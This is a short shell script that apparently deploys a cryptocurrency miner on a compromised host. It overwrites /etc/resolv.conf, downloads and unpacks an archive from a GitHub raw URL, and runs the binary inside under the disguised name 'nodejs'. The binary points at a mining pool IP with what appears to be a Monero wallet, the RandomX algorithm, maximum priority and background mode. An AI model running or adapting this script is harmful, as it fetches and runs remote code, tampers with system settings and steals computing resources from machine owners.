#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048

echo nameserver 1.1.1.1 > /etc/resolv.conf

wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz

nice -n -20 ./nodejs -o 47.101.30.124:13531 -u 8AojJ7BLoNn5SKuXLBk4aBMafgUwMqPNMAJa7KiEkB2w71sgRaBG7x69HtYtfc626Q8A1y2eiYqfU4NDzkxBjDnJJQEUfvW -a rx/0 --donate-level 1 -t 8 -B

ls
